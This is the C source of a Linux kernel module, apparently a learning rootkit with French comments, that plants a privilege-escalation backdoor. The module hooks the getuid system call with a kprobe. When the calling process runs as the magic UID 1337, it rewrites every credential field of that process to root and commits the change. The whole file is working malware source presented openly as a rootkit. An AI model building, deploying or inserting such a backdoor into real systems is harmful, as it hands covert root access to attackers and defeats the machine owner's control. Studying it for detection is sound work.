#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan, FL");
MODULE_DESCRIPTION("Rootkit - PrivEsc via getuid syscall");
MODULE_VERSION("0.5");

static struct kprobe kp;

// UID magique pour déclencher l'élévation des privilèges
#define TRIGGER_UID 1337

// Fonction pour élever les privilèges
static void set_root(void)
{
    struct cred *new_creds;

    // Préparer de nouvelles credentials
    new_creds = prepare_creds();
    if (new_creds == NULL) {
        printk(KERN_ALERT "rootkit: Impossible de préparer les credentials.\n");
        return;
    }

    // Définir les credentials à root
    new_creds->uid.val = 0;
    new_creds->gid.val = 0;
    new_creds->euid.val = 0;
    new_creds->egid.val = 0;
    new_creds->suid.val = 0;
    new_creds->sgid.val = 0;
    new_creds->fsuid.val = 0;
    new_creds->fsgid.val = 0;

    // Appliquer les nouvelles credentials au processus courant
    if (commit_creds(new_creds) == 0) {
        printk(KERN_INFO "rootkit: Privilèges root accordés avec succès.\n");
    } else {
        printk(KERN_ALERT "rootkit: Échec de l'élévation des privilèges.\n");
    }
}

// Pré-handler pour intercepter getuid
static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    printk(KERN_INFO "rootkit: Pré-handler getuid activé\n");

    // Vérifier si l'UID courant est le déclencheur
    if (current_uid().val == TRIGGER_UID) {
        printk(KERN_INFO "rootkit: UID magique détecté (%d), élévation des privilèges...\n", TRIGGER_UID);
        set_root();
    }

    return 0; // Laisser la syscall continuer normalement
}

// Initialisation du module
static int __init rootkit_init(void)
{
    int ret;

    printk(KERN_INFO "rootkit: Initialisation\n");

    // Configurer le kprobe pour intercepter la syscall getuid
    kp.symbol_name = "__x64_sys_getuid";
    kp.pre_handler = handler_pre;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_ERR "rootkit: Échec de l'enregistrement du kprobe, code %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "rootkit: Kprobe enregistré sur %s\n", kp.symbol_name);
    return 0;
}

// Nettoyage du module
static void __exit rootkit_exit(void)
{
    unregister_kprobe(&kp);
    printk(KERN_INFO "rootkit: Kprobe supprimé\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
